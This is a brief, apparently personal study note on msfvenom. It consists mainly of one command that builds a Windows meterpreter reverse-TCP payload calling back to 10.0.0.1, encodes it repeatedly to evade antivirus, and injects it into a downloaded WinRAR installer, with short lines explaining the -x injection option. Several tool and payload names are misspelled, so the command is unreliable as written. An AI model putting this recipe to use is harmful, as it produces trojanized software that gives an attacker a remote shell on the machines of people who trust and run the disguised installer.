mafvenom
- msfvenome -p windows/meterpter/reverse__tcp LHOST=10.0.0.1 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_payloads/encoded86.exe
- we specify where we want to inject  and we want to inject it in winrar executable that we download 
- the following Msfvenom options can be used to specify a custom executable file for injection using -x then path to winrar file
- 